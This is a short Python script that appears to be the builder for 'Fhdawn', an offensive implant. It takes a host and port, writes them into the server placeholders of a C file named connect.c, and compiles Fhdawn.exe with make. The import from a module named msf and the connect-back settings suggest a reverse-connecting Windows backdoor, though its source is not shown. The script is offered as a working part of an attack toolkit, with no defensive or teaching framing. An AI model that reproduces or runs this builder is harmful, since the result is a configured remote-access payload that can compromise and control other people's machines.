from .msf import inplace_change
import subprocess
import os

def Build(host, port):
    os.chdir("fhdawn")
    inplace_change("connect.c", "{{serverhost}}", host)
    inplace_change("connect.c", "{{serverport}}", port)
    subprocess.call(["make"])
    if(os.path.isfile("Fhdawn.exe")):
        print("[+] Built : {x}".format(x = os.path.abspath("Fhdawn.exe")))
    else:
        print("[X] Error building Fhdawn.")

    os.chdir("..")